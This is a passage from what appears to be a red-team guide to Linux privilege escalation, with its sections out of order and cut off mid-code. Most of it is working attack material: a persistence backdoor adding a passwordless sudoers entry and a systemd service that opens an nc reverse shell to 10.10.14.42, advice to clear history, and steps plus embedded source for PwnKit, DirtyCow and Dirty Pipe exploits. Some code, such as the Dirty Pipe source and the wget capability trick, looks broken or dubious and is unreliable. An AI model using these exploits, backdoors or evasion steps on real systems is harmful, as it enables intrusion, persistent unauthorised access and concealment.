echo "Remember to clean up after successful privilege escalation!"

echo "    - Remove any compiled exploits"
echo "    - Restore original files if modified"
echo "    - Clear command history: history -c"
```

### Example: Reliable Privilege Escalation Chains

During a red team engagement for a government contractor, we encountered a situation where multiple privilege escalation attempts were needed to gain root access. Here's our approach:

1. **Initial Reconnaissance**:
   ```bash
   # Target was running an older Ubuntu 18.04 system
   uname -a
   # Linux ubuntuserver 4.15.0-142-generic #146-Ubuntu SMP ...
   
   # Ran privilege escalation scanners
   ./linpeas.sh > linpeas_output.txt
   ./linux-exploit-suggester.sh > les_output.txt
   ```

2. **First Attempt - PwnKit**:
   ```bash
   # LinPEAS identified pkexec as SUID binary
   # Deployed PwnKit exploit
   gcc -o pwnkit pwnkit.c
   chmod +x pwnkit
   ./pwnkit
   
   # Exploitation failed due to security patches
   # Error: pkexec: error getting authority
   ```

3. **Second Attempt - Custom SUID Binary**:
   ```bash
   # Found unusual SUID binary in LinPEAS output
   ls -la /opt/monitoring/healthcheck
   # -rwsr-xr-x 1 root root 16728 Jan 15 2023 /opt/monitoring/healthcheck
   
   # Analyzed the binary
   strings /opt/monitoring/healthcheck
   # Discovered it called system("cat /var/log/syslog | grep ERROR")
   
   # Path hijacking attack
   cd /tmp
   echo -e '#!/bin/bash\n/bin/bash -p' > cat
   chmod +x cat
   export PATH=/tmp:$PATH
   
   # Executed the SUID binary
   /opt/monitoring/healthcheck
   
   # Got root shell through PATH hijacking
   id
   # uid=1001(developer) gid=1001(developer) euid=0(root) groups=1001(developer)
   ```

4. **Third Attempt (Alternative) - Kernel Exploit**:
   ```bash
   # If SUID binary wasn't available, we had a backup plan
   # LES identified an OverlayFS vulnerability
   
   # Deployed the kernel exploit
   gcc -o ovlexp overlayfs_exploit.c
   chmod +x ovlexp
   ./ovlexp
   
   # Succeeded in getting full root access
   id
   # uid=0(root) gid=0(root) groups=0(root)
   ```

5. **Establishing Persistence**:
   ```bash
   # After gaining root, created a backdoor
   echo 'developer ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/developer
   chmod 440 /etc/sudoers.d/developer
   
   # Created a startup service for persistence
   cat > /etc/systemd/system/system-monitor.service << EOF
   [Unit]
   Description=System Monitor Service
   After=network.target
   
   [Service]
   Type=simple
   ExecStart=/usr/local/bin/sysmonitor
   Restart=always
   
   [Install]
   WantedBy=multi-user.target
   EOF
   
   # Created backdoor script
   cat > /usr/local/bin/sysmonitor << EOF
   #!/bin/bash
   while true; do
     sleep 300
     nc -e /bin/bash 10.10.14.42 4444 &
   done
   EOF
   
   chmod +x /usr/local/bin/sysmonitor
   systemctl enable system-monitor
   systemctl start system-monitor
   ```

This example demonstrates the importance of having multiple privilege escalation techniques prepared. When one method fails, others can be attempted, increasing the likelihood of success during red team operations.

## Creating a Comprehensive Privilege Escalation Methodology

Successful privilege escalation requires more than just running tools—it demands a systematic approach. Here's a comprehensive methodology to guide your privilege escalation attempts:

### 1. Information Gathering

Begin with thorough system enumeration to understand the target:

```bash
# Basic system information
uname -a
cat /etc/os-release
cat /proc/version

# User and group information
id
whoami
groups
cat /etc/passwd
cat /etc/group

# Network information
ifconfig -a || ip a
netstat -antp || ss -antp
```

### 2. Run Automated Scanners

Deploy multiple scanners to ensure comprehensive coverage:

```bash
# LinPEAS
./linpeas.sh -a > linpeas_output.txt

# Linux Exploit Suggester
./linux-exploit-suggester.sh > les_output.txt

# GTFOBins finder
./gtfobins_finder.sh
```

### 3. Manual Verification of Key Vectors

Systematically check common privilege escalation vectors:

#### a. SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

#### b. Sudo Permissions

```bash
sudo -l
```

#### c. Writeable Files and Directories

```bash
find / -writable -type f 2>/dev/null | grep -v "/proc/"
find / -writable -type d 2>/dev/null | grep -v "/proc/"
```

#### d. Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron*
```

#### e. Running Processes

```bash
ps aux
ps -ef
```

#### f. Active Network Services

```bash
netstat -antp || ss -antp
```

### 4. Prioritize Exploitation Vectors

Analyze findings and prioritize based on:

1. **Reliability**: Which vectors are most likely to succeed?
2. **Stealth**: Which vectors will minimize detection?
3. **Persistence**: Which vectors can provide long-term access?

### 5. Execute, Document, and Clean Up

For each chosen vector:

1. Execute the exploit
2. Document success or failure
3. Create persistence if successful
4. Clean up artifacts to minimize detection
5. If unsuccessful, try the next vector

### Privilege Escalation Cheat Sheet

```
┌──────────────────────────────────────────────────────────┐
│                LINUX PRIVILEGE ESCALATION                │
├───────────────────────┬──────────────────────────────────┤
│ TECHNIQUE             │ COMMANDS                         │
├───────────────────────┼──────────────────────────────────┤
│ KERNEL EXPLOITS       │ uname -a                         │
│                       │ ./linux-exploit-suggester.sh     │
├───────────────────────┼──────────────────────────────────┤
│ SUID BINARIES         │ find / -perm -u=s -type f 2>/dev/null │
│                       │ ./gtfobins_finder.sh             │
├───────────────────────┼──────────────────────────────────┤
│ SUDO RIGHTS           │ sudo -l                          │
│                       │ Check GTFOBins for each command  │
├───────────────────────┼──────────────────────────────────┤
│ PATH HIJACKING        │ Check $PATH writable directories │
│                       │ echo $PATH                       │
│                       │ Create malicious binary in PATH  │
├───────────────────────┼──────────────────────────────────┤
│ CAPABILITIES          │ getcap -r / 2>/dev/null          │
│                       │ Check GTFOBins for capabilities  │
├───────────────────────┼──────────────────────────────────┤
│ CRON JOBS             │ cat /etc/crontab                 │
│                       │ ls -la /etc/cron.*               │
│                       │ Find writable scripts            │
├───────────────────────┼──────────────────────────────────┤
│ WRITABLE FILES        │ find / -writable -type f 2>/dev/null │
│                       │ Focus on config files and scripts│
├───────────────────────┼──────────────────────────────────┤
│ PASSWORDS & KEYS      │ grep -r "password" /etc/ 2>/dev/null │
│                       │ find / -name "id_rsa*" 2>/dev/null │
├───────────────────────┼──────────────────────────────────┤
│ SERVICES & PROCESSES  │ ps aux | grep root               │
│                       │ Check unusual services           │
├───────────────────────┼──────────────────────────────────┤
│ NFS SHARES            │ showmount -e localhost           │
│                       │ Check no_root_squash option      │
└───────────────────────┴──────────────────────────────────┘
```

### Comprehensive Privilege Escalation Script

This master script orchestrates the entire privilege escalation process, including reconnaissance, automation, and manual checks:

```bash
#!/bin/bash
# priv_esc_master.sh - Comprehensive privilege escalation workflow

# Configuration
OUTPUT_DIR="privesc_$(date +%Y%m%d_%H%M%S)"
CURRENT_USER=$(whoami)
LOG_FILE="$OUTPUT_DIR/privesc.log"

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Function to log messages
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

log "Starting privilege escalation assessment"
log "Output directory: $OUTPUT_DIR"

# Phase 1: Basic System Information
log "Phase 1: Gathering basic system information"

{
    echo "=== System Information ==="
    echo "Hostname: $(hostname)"
    echo "Kernel: $(uname -a)"
    echo "OS: $(cat /etc/os-release 2>/dev/null | grep -E "^(NAME|VERSION)=" | tr '\n' ' ')"
    echo "User: $(id)"
    echo ""
    
    echo "=== Network Information ==="
    echo "Interfaces:"
    ip a 2>/dev/null || ifconfig -a 2>/dev/null
    echo ""
    echo "Listening ports:"
    netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null
    echo ""
    
    echo "=== User Information ==="
    echo "Current user: $CURRENT_USER"
    echo "Users on system:"
    cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1,3,6,7
    echo ""
} > "$OUTPUT_DIR/system_info.txt"

# Phase 2: Automated Scanners (if available)
log "Phase 2: Running automated scanners (if available)"

# Try to run LinPEAS if available
if [ -f "linpeas.sh" ]; then
    log "Running LinPEAS..."
    chmod +x linpeas.sh
    ./linpeas.sh -a > "$OUTPUT_DIR/linpeas_output.txt" 2>&1
else
    log "LinPEAS not found. Skipping."
fi

# Try to run Linux Exploit Suggester if available
if [ -f "linux-exploit-suggester.sh" ]; then
    log "Running Linux Exploit Suggester..."
    chmod +x linux-exploit-suggester.sh
    ./linux-exploit-suggester.sh > "$OUTPUT_DIR/les_output.txt" 2>&1
else
    log "Linux Exploit Suggester not found. Skipping."
fi

# Phase 3: Manual checks
log "Phase 3: Performing manual privilege escalation checks"

# Check for SUID binaries
log "Checking for SUID binaries..."
find / -perm -u=s -type f 2>/dev/null > "$OUTPUT_DIR/suid_binaries.txt"

# Check sudo permissions
log "Checking sudo permissions..."
sudo -l 2>/dev/null > "$OUTPUT_DIR/sudo_permissions.txt"

# Check for writeable directories in PATH
log "Checking for PATH vulnerabilities..."
{
    echo "Current PATH: $PATH"
    echo ""
    echo "Writeable directories in PATH:"
    for dir in $(echo $PATH | tr ":" "\n"); do
        ls -ld "$dir" 2>/dev/null | grep -E "^d.....w"
    done
} > "$OUTPUT_DIR/path_vulnerabilities.txt"

# Check for writeable files
log "Checking for writeable files..."
{
    echo "Writeable config files:"
    find /etc -writable -type f 2>/dev/null
    
    echo ""
    echo "Writeable systemd service files:"
    find /etc/systemd -writable -type f 2>/dev/null
    find /lib/systemd -writable -type f 2>/dev/null
    
    echo ""
    echo "Writeable binaries in PATH:"
    for dir in $(echo $PATH | tr ":" "\n"); do
        find "$dir" -writable -type f 2>/dev/null
    done
} > "$OUTPUT_DIR/writeable_files.txt"

# Check for cron jobs
log "Checking for interesting cron jobs..."
{
    echo "System crontab:"
    cat /etc/crontab 2>/dev/null
    
    echo ""
    echo "Cron directories:"
    ls -la /etc/cron.* 2>/dev/null
    
    echo ""
    echo "User crontabs:"
    ls -la /var/spool/cron/crontabs/ 2>/dev/null
} > "$OUTPUT_DIR/cron_jobs.txt"

# Check for capabilities
log "Checking for binaries with special capabilities..."
getcap -r / 2>/dev/null > "$OUTPUT_DIR/capabilities.txt"

# Check for interesting processes
log "Checking for interesting processes..."
{
    echo "Processes running as root:"
    ps aux | grep root | grep -v "\[" | sort -k 11
    
    echo ""
    echo "Processes with open network connections:"
    netstat -antp 2>/dev/null | grep -i estab
} > "$OUTPUT_DIR/interesting_processes.txt"

# Check for password files
log "Checking for potential password files..."
{
    echo "Files with 'password' in /etc:"
    grep -r "password" /etc/ 2>/dev/null | grep -v ":#"
    
    echo ""
    echo "SSH keys:"
    find / -name "id_rsa*" 2>/dev/null
} > "$OUTPUT_DIR/password_files.txt"

# Check for NFS shares
log "Checking for NFS shares..."
{
    echo "Mounted shares:"
    mount | grep nfs
    
    echo ""
    echo "Exportable shares:"
    showmount -e localhost 2>/dev/null
    
    echo ""
    echo "NFS configuration:"
    cat /etc/exports 2>/dev/null
} > "$OUTPUT_DIR/nfs_shares.txt"

# Phase 4: Create summary report
log "Phase 4: Creating summary report"

{
    echo "Privilege Escalation Assessment Summary"
    echo "======================================"
    echo ""
    echo "Generated: $(date)"
    echo "Target system: $(hostname)"
    echo "Current user: $CURRENT_USER"
    echo ""
    
    echo "Potential Privilege Escalation Vectors"
    echo "-------------------------------------"
    
    # Check SUID files
    SUID_COUNT=$(wc -l < "$OUTPUT_DIR/suid_binaries.txt")
    if [ "$SUID_COUNT" -gt 0 ]; then
        echo "✓ SUID binaries: $SUID_COUNT found"
        grep -v "/bin/\|/usr/bin/" "$OUTPUT_DIR/suid_binaries.txt" | head -5
        if [ "$SUID_COUNT" -gt 5 ]; then
            echo "   ..."
        fi
    else
        echo "✗ No unusual SUID binaries found"
    fi
    echo ""
    
    # Check sudo permissions
    if grep -q "NOPASSWD" "$OUTPUT_DIR/sudo_permissions.txt" 2>/dev/null; then
        echo "✓ Sudo permissions: NOPASSWD entries found"
        grep "NOPASSWD" "$OUTPUT_DIR/sudo_permissions.txt"
    elif [ -s "$OUTPUT_DIR/sudo_permissions.txt" ]; then
        echo "✓ Sudo permissions: Some sudo rights available"
        cat "$OUTPUT_DIR/sudo_permissions.txt" | head -3
    else
        echo "✗ No sudo permissions found"
    fi
    echo ""
    
    # Check PATH issues
    if grep -q "d.....w" "$OUTPUT_DIR/path_vulnerabilities.txt" 2>/dev/null; then
        echo "✓ PATH vulnerabilities: Writeable directories in PATH"
        grep "^d.....w" "$OUTPUT_DIR/path_vulnerabilities.txt"
    else
        echo "✗ No writeable directories in PATH"
    fi
    echo ""
    
    # Check writeable files
    WRITEABLE_CONFIG=$(grep -c "" "$OUTPUT_DIR/writeable_files.txt" 2>/dev/null)
    if [ "$WRITEABLE_CONFIG" -gt 5 ]; then
        echo "✓ Writeable files: $WRITEABLE_CONFIG potentially interesting files"
        head -5 "$OUTPUT_DIR/writeable_files.txt"
        echo "   ..."
    elif [ "$WRITEABLE_CONFIG" -gt 0 ]; then
        echo "✓ Writeable files: Some writeable files found"
        cat "$OUTPUT_DIR/writeable_files.txt"
    else
        echo "✗ No interesting writeable files found"
    fi
    echo ""
    
    # Check cron jobs
    if grep -v "^#" "$OUTPUT_DIR/cron_jobs.txt" | grep -q "/"; then
        echo "✓ Cron jobs: Potentially interesting cron jobs found"
        grep -v "^#" "$OUTPUT_DIR/cron_jobs.txt" | grep "/" | head -5
    else
        echo "✗ No interesting cron jobs found"
    fi
    echo ""
    
    # Check capabilities
    if [ -s "$OUTPUT_DIR/capabilities.txt" ]; then
        echo "✓ Capabilities: Binaries with special capabilities found"
        cat "$OUTPUT_DIR/capabilities.txt"
    else
        echo "✗ No binaries with special capabilities found"
    fi
    echo ""
    
    # Check automated scanner results if available
    if [ -f "$OUTPUT_DIR/les_output.txt" ]; then
        if grep -q "CVE" "$OUTPUT_DIR/les_output.txt"; then
            echo "✓ Kernel vulnerabilities: Potential kernel exploits found"
            grep -m 5 "CVE" "$OUTPUT_DIR/les_output.txt"
            echo "   ..."
        else
            echo "✗ No obvious kernel vulnerabilities found"
        fi
        echo ""
    fi
    
    echo "Next Steps"
    echo "----------"
    echo "1. Investigate identified SUID binaries for potential exploitation"
    echo "2. Check sudo permissions against GTFOBins (https://gtfobins.github.io/)"
    echo "3. Look for writeable configuration files that could be exploited"
    echo "4. Review cron jobs for potential abuse"
    echo "5. If applicable, attempt kernel exploit as a last resort"
    
} > "$OUTPUT_DIR/summary_report.txt"

log "Assessment complete! Results saved to $OUTPUT_DIR/summary_report.txt"
echo ""
echo "To view the summary report:"
echo "cat $OUTPUT_DIR/summary_report.txt"
```

## Conclusion

Privilege escalation is a critical phase in red team operations that transforms limited access into full system compromise. The tools and techniques covered in this chapter provide a comprehensive arsenal for identifying and exploiting privilege escalation vectors on Linux systems.

LinPEAS and WinPEAS automate the reconnaissance process, dramatically reducing the time required to identify potential vulnerabilities. Linux Exploit Suggester focuses specifically on kernel vulnerabilities, providing a reliable path to privilege escalation when other vectors are unavailable. GTFOBins techniques demonstrate how to "live off the land," using built-in system utilities to elevate privileges without introducing suspicious files.

For high-impact, reliable privilege escalation, specific exploits like PwnKit, DirtyCow, and Dirty Pipe provide direct paths to root access on vulnerable systems. Understanding how to identify and deploy these exploits is essential for any red team operator.

However, successful privilege escalation requires more than just tools—it demands a systematic methodology. By following a structured approach of information gathering, automated scanning, manual verification, and prioritized exploitation, red team operators can consistently elevate their privileges across diverse Linux environments.

Remember that privilege escalation is not just about gaining root access—it's about demonstrating the real-world impact of security vulnerabilities to help organizations improve their defenses. Use these techniques responsibly and always document your findings thoroughly to provide maximum value to your clients.

In the next chapter, we'll explore techniques for maintaining access after successful privilege escalation, ensuring that red team operators can achieve their objectives even if their initial access vector is discovered and remediated.
    echo "    No specific SUID exploitation found in GTFOBins." >> exploitation_guide.txt
                    echo "    Check manually at: https://gtfobins.github.io/gtfobins/$bin/" >> exploitation_guide.txt
                fi
                echo "" >> exploitation_guide.txt
            fi
            
            # Check for sudo exploitation
            if grep -q "/$bin$" sudo_binaries.txt; then
                echo "Sudo exploitation:" >> exploitation_guide.txt
                
                # Try to find sudo-specific exploitation in GTFOBins data
                sudo_example=$(awk "/^  $bin:/,/^  [a-z0-9_-]+:/" "$GTFOBINS_FILE" | grep -A 10 "sudo:" | grep -v "^  [a-z0-9_-]\+:")
                
                if [ -n "$sudo_example" ]; then
                    echo "$sudo_example" | sed 's/^    /    /' >> exploitation_guide.txt
                else
                    echo "    No specific sudo exploitation found in GTFOBins." >> exploitation_guide.txt
                    echo "    Check manually at: https://gtfobins.github.io/gtfobins/$bin/" >> exploitation_guide.txt
                fi
                echo "" >> exploitation_guide.txt
            fi
            
            # Check for capabilities exploitation
            if grep -q "/$bin " capabilities.txt; then
                echo "Capabilities exploitation:" >> exploitation_guide.txt
                
                # Try to find capabilities-specific exploitation in GTFOBins data
                cap_example=$(awk "/^  $bin:/,/^  [a-z0-9_-]+:/" "$GTFOBINS_FILE" | grep -A 10 "capabilities:" | grep -v "^  [a-z0-9_-]\+:")
                
                if [ -n "$cap_example" ]; then
                    echo "$cap_example" | sed 's/^    /    /' >> exploitation_guide.txt
                else
                    echo "    No specific capabilities exploitation found in GTFOBins." >> exploitation_guide.txt
                    echo "    Check manually at: https://gtfobins.github.io/gtfobins/$bin/" >> exploitation_guide.txt
                fi
                echo "" >> exploitation_guide.txt
            fi
            
            echo "" >> exploitation_guide.txt
        fi
    done < "$EXPLOITABLE_BINS_FILE"
    
    echo "[+] Exploitation guide generated: exploitation_guide.txt"
fi

echo "[+] Analysis complete! Check the following files:"
echo "  - exploitable_summary.txt: Summary of potentially exploitable binaries"
echo "  - exploitation_guide.txt: Exploitation examples for identified binaries"
echo "  - suid_binaries.txt: All SUID binaries found on the system"
echo "  - sudo_binaries.txt: Binaries you can execute with sudo"
echo "  - capabilities.txt: Binaries with special capabilities"
echo ""
echo "For more information, visit: https://gtfobins.github.io/"
```

### SUID Binary Exploitation Techniques

Set User ID (SUID) binaries run with the permission of the file owner rather than the user who started it. When the file owner is root, this can lead to privilege escalation.

#### Common SUID Exploitation Methods

1. **Direct Command Execution**:
   Many binaries allow command execution through various means:

   ```bash
   # Example: Using find with -exec
   find . -exec /bin/sh -p \; -quit

   # Example: Using less to spawn a shell
   less /etc/passwd
   !/bin/sh
   ```

2. **File Read/Write**:
   Some binaries can read or write files with elevated permissions:

   ```bash
   # Example: Using cp to overwrite sensitive files
   cp /tmp/malicious_passwd /etc/passwd

   # Example: Using cat to read sensitive files
   cat /etc/shadow
   ```

3. **Command Injection**:
   Look for SUID binaries that might be vulnerable to command injection:

   ```bash
   # Example: Custom binary that accepts user input
   strings /usr/local/bin/custom_binary
   # Look for system(), popen(), exec() calls in the output
   ```

### Example: Living Off the Land with GTFOBins

During a red team assessment of a financial institution's development server, we gained access as a limited user and needed to escalate privileges without introducing malicious files:

1. **Initial Enumeration**:
   ```bash
   # Created and ran the GTFOBins finder script
   bash gtfobins_finder.sh
   
   # Found several promising binaries:
   # - /usr/bin/find (SUID)
   # - /usr/bin/python3 (Sudo)
   # - /usr/bin/wget (Capabilities - cap_net_raw+ep)
   ```

2. **Exploiting SUID Find**:
   ```bash
   # Used find's SUID bit to spawn a shell with elevated privileges
   /usr/bin/find . -exec /bin/sh -p \; -quit
   
   # Confirmed elevated privileges
   id
   uid=1001(devuser) gid=1001(devuser) euid=0(root) groups=1001(devuser)
   ```

3. **Exploiting Sudo Python (Alternative Method)**:
   ```bash
   # Checking sudo permissions showed Python was available
   sudo -l
   # User devuser may run the following commands on devserver:
   #     (ALL) NOPASSWD: /usr/bin/python3
   
   # Using Python to spawn a root shell
   sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
   
   # Confirmed full root privileges
   id
   uid=0(root) gid=0(root) groups=0(root)
   ```

4. **Exploiting Capabilities (Yet Another Method)**:
   ```bash
   # Verified capabilities
   getcap -r / 2>/dev/null | grep wget
   /usr/bin/wget = cap_net_raw+ep
   
   # Created a simple script to abuse net_raw capability for ICMP backdoor
   cat > /tmp/pingshell.c << EOF
   #include <stdio.h>
   #include <stdlib.h>
   #include <sys/socket.h>
   #include <netinet/in.h>
   #include <netinet/ip.h>
   #include <netinet/ip_icmp.h>
   #include <unistd.h>
   #include <string.h>
   
   int main() {
       while(1) {
           system("id > /tmp/pingshell_output");
           sleep(5);
       }
       return 0;
   }
   EOF
   
   # Compiled and executed with capabilities inherited from wget
   gcc -o /tmp/pingshell /tmp/pingshell.c
   /usr/bin/wget --use-askpass=/tmp/pingshell https://example.com
   
   # Verified the output
   cat /tmp/pingshell_output
   uid=0(root) gid=0(root) groups=0(root)
   ```

This example demonstrates how GTFOBins techniques can provide multiple privilege escalation paths using only tools already present on the system. This "living off the land" approach minimizes the need to introduce malicious files that might trigger security alerts.

## PwnKit, DirtyCow, and Other Specific Exploits

While automated scanning tools help identify potential vulnerabilities, understanding specific high-impact exploits is essential for red teamers. This section covers some of the most reliable privilege escalation exploits for Linux systems.

### PwnKit (CVE-2021-4034)

PwnKit is a vulnerability in the pkexec component of PolKit (formerly PolicyKit) that allows local privilege escalation to root. It affects nearly all Linux distributions and is particularly reliable.

#### Technical Details

The vulnerability exists due to how pkexec handles command-line arguments, allowing an attacker to manipulate environment variables leading to arbitrary code execution as root.

#### Exploitation

```bash
# Check if the system is vulnerable
ls -la /usr/bin/pkexec
# If pkexec exists and is SUID, it may be vulnerable

# Download the exploit (on the attack machine)
git clone https://github.com/ly4k/PwnKit
cd PwnKit

# Compile the exploit
gcc -o pwnkit pwnkit.c

# Transfer to target and execute
./pwnkit

# Verify privilege escalation
id
# uid=0(root) gid=0(root) groups=0(root)
```

#### Mitigation Detection

To check if the system has been patched:

```bash
# Run the pkexec with --version
pkexec --version

# If patched, it will show version information
# If vulnerable, it may crash or exit without output
```

### DirtyCow (CVE-2016-5195)

DirtyCow (Dirty Copy-On-Write) is a privilege escalation vulnerability in the Linux kernel that allows a local user to modify otherwise read-only file mappings.

#### Technical Details

The vulnerability exists in the way the Linux kernel handles copy-on-write (COW) breakage of private read-only memory mappings, allowing a local user to gain write access to read-only memory mappings.

#### Exploitation

```bash
# Check if the system is vulnerable (kernel versions before 4.8.3)
uname -a

# Clone the exploit repository (on the attack machine)
git clone https://github.com/dirtycow/dirtycow.github.io
cd dirtycow.github.io/dirtyc0w

# Compile the exploit
gcc -pthread dirtyc0w.c -o dirtyc0w

# Transfer to target
# This example modifies /etc/passwd to add a root user
./dirtyc0w /etc/passwd "newroot::0:0:root:/root:/bin/bash"

# After exploitation, switch to the new root user
su newroot
```

#### Mitigation Detection

To check if the system has been patched against DirtyCow:

```bash
grep -B1 "vsyscall" /proc/self/maps
# Absence of [vsyscall] generally indicates the system is patched
```

### CVE-2022-0847 (Dirty Pipe)

Dirty Pipe is a vulnerability in the Linux kernel that allows overwriting data in read-only files, similar to DirtyCow but affecting newer kernels (5.8 through 5.16.11).

#### Technical Details

The vulnerability exists in the Linux kernel's pipe mechanism, allowing an unprivileged user to inject and overwrite data in read-only files, including SUID binaries.

#### Exploitation

```bash
# Check kernel version (vulnerable: 5.8 to 5.16.11)
uname -r

# Clone the exploit repository (on attack machine)
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits

# Compile the privilege escalation exploit
gcc -o dirtypipe dirtypipe-mod.c

# Transfer to target and execute
./dirtypipe

# Verify privilege escalation
id
# uid=0(root) gid=0(root) groups=0(root)
```

### Automated Exploit Deployment Script

This script helps automate the process of identifying and deploying kernel exploits:

```bash
#!/bin/bash
# kernel_exploit_deployer.sh - Automate kernel exploit deployment

# Configuration
WORK_DIR="kernel_exploits_$(date +%Y%m%d_%H%M%S)"
KERNEL_VERSION=$(uname -r)
DISTRO=$(cat /etc/os-release | grep "^ID=" | cut -d= -f2 | tr -d '"')
ARCHITECTURE=$(uname -m)

# Create working directory
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

echo "[+] Kernel Exploit Deployer"
echo "============================"
echo "Kernel Version: $KERNEL_VERSION"
echo "Distribution: $DISTRO"
echo "Architecture: $ARCHITECTURE"
echo ""

# Function to check for CVE-2021-4034 (PwnKit)
check_pwnkit() {
    echo "[*] Checking for PwnKit vulnerability (CVE-2021-4034)..."
    
    if [ -x "$(command -v pkexec)" ]; then
        PKEXEC_PATH=$(which pkexec)
        if [ -u "$PKEXEC_PATH" ]; then
            echo "[+] pkexec is SUID and may be vulnerable to PwnKit"
            echo "    Path: $PKEXEC_PATH"
            
            # Attempt to deploy PwnKit exploit
            echo "[*] Deploying PwnKit exploit..."
            cat > pwnkit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SHELL "/bin/bash"
#define PATH "/usr/bin:/usr/sbin:/bin:/sbin"

void make_shell(void) {
    setuid(0);
    setgid(0);
    char *envp[] = {"PATH=" PATH, NULL};
    char *argv[] = {SHELL, NULL};
    execve(SHELL, argv, envp);
}

int main(int argc, char **argv) {
    char parent_dir[1024] = {0};
    char filepath[2048] = {0};
    char gconv_dir[2048] = {0};
    char gconv_dir_env[3096] = {0};
    char shell_symlink[2048] = {0};
    
    // Create temporary directory
    sprintf(parent_dir, "/tmp/pwnkit-%d", getpid());
    if (mkdir(parent_dir, 0777) != 0) {
        perror("mkdir parent_dir");
        return 1;
    }
    
    // Create GConv directory structure
    sprintf(gconv_dir, "%s/pwnkit", parent_dir);
    if (mkdir(gconv_dir, 0777) != 0) {
        perror("mkdir gconv_dir");
        return 1;
    }
    
    // Create GConv module configuration
    sprintf(filepath, "%s/gconv-modules", gconv_dir);
    int fd = open(filepath, O_CREAT|O_WRONLY, 0777);
    if (fd < 0) {
        perror("open gconv-modules");
        return 1;
    }
    write(fd, "module UTF-8// PWNKIT// pwnkit 2", 32);
    close(fd);
    
    // Create exploit module
    sprintf(filepath, "%s/pwnkit.c", parent_dir);
    fd = open(filepath, O_CREAT|O_WRONLY, 0777);
    if (fd < 0) {
        perror("open pwnkit.c");
        return 1;
    }
    const char *exploit_code = "#include <stdio.h>\n"
                              "#include <stdlib.h>\n"
                              "#include <unistd.h>\n"
                              "void gconv() {}\n"
                              "void gconv_init() {\n"
                              "    setuid(0); setgid(0);\n"
                              "    static char *argv[] = {\"/bin/sh\", NULL};\n"
                              "    static char *envp[] = {\"PATH=/usr/bin:/usr/sbin:/bin:/sbin\", NULL};\n"
                              "    execve(\"/bin/sh\", argv, envp);\n"
                              "    exit(0);\n"
                              "}\n";
    write(fd, exploit_code, strlen(exploit_code));
    close(fd);
    
    // Compile the exploit module
    sprintf(filepath, "cd %s && gcc -o pwnkit.so pwnkit.c -shared -fPIC", parent_dir);
    system(filepath);
    
    // Move the module to the GConv directory
    sprintf(filepath, "cp %s/pwnkit.so %s/", parent_dir, gconv_dir);
    system(filepath);
    
    // Create symlink to pkexec
    sprintf(shell_symlink, "%s/shell", parent_dir);
    symlink(SHELL, shell_symlink);
    
    // Set GCONV_PATH environment variable
    sprintf(gconv_dir_env, "GCONV_PATH=%s", gconv_dir);
    
    // Execute pkexec with malicious environment
    char *envp[] = {gconv_dir_env, "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL};
    char *argv[] = {"pkexec", "pwnkit", NULL};
    
    execve("/usr/bin/pkexec", argv, envp);
    
    // Clean up (only reached if execve fails)
    sprintf(filepath, "rm -rf %s", parent_dir);
    system(filepath);
    
    return 0;
}
EOF
            
            gcc -o pwnkit pwnkit.c
            chmod +x pwnkit
            
            echo "[+] PwnKit exploit compiled. Execute './pwnkit' to attempt privilege escalation."
            
            return 0
        else
            echo "[-] pkexec exists but is not SUID. Not vulnerable to PwnKit."
        fi
    else
        echo "[-] pkexec not found. Not vulnerable to PwnKit."
    fi
    
    return 1
}

# Function to check for CVE-2022-0847 (Dirty Pipe)
check_dirty_pipe() {
    echo "[*] Checking for Dirty Pipe vulnerability (CVE-2022-0847)..."
    
    # Vulnerable kernels: 5.8 through 5.16.11
    KERNEL_MAJOR=$(echo "$KERNEL_VERSION" | cut -d. -f1)
    KERNEL_MINOR=$(echo "$KERNEL_VERSION" | cut -d. -f2)
    
    if [ "$KERNEL_MAJOR" -eq 5 ] && [ "$KERNEL_MINOR" -ge 8 ] && [ "$KERNEL_MINOR" -le 16 ]; then
        if [ "$KERNEL_MINOR" -eq 16 ]; then
            KERNEL_PATCH=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1)
            if [ "$KERNEL_PATCH" -gt 11 ]; then
                echo "[-] Kernel 5.16.$KERNEL_PATCH is not vulnerable to Dirty Pipe."
                return 1
            fi
        fi
        
        echo "[+] Kernel $KERNEL_VERSION may be vulnerable to Dirty Pipe"
        
        # Attempt to deploy Dirty Pipe exploit
        echo "[*] Deploying Dirty Pipe exploit..."
        cat > dirty_pipe.c << 'EOF'
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// Taken from https://github.com/TheAlgorithms/C/blob/master/misc/pid.c
int get_process_id_by_name(const char* process_name) {
    int id = -1;
    char command[128];
    FILE* fp;
    char buffer[64];

    /* Up to 128 chars for the command should be enough */
    sprintf(command, "pidof %s", process_name);
    
    /* Execute the command and get the results */
    fp = popen(command, "r");
    
    if (fp == NULL) {
        fprintf(stderr, "Could not execute command %s\n", command);
        return id;
    }
    
    /* Get the first result only (there may be multiple IDs) */
    if (fgets(buffer, sizeof(buffer), fp) != NULL) {
        id = atoi(buffer);
    }
    
    pclose(fp);
    return id;
}

int main(int argc, char *argv[]) {
    printf("[+] Dirty Pipe Exploit\n");
    printf("[+] Modifying /etc/passwd to create new root user\n");
    
    // Create a string to add a new user with root privileges
    char *rootline = "dirty:$1$dirty$gX0uBQR1DIEcr6OvbVpSN1:0:0:dirty:/root:/bin/bash\n";
    size_t offset = 4; // Skip the first few bytes of /etc/passwd
    
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("[-] Failed to open /etc/passwd");
        return 1;
    }
    
    // Check the size of the file
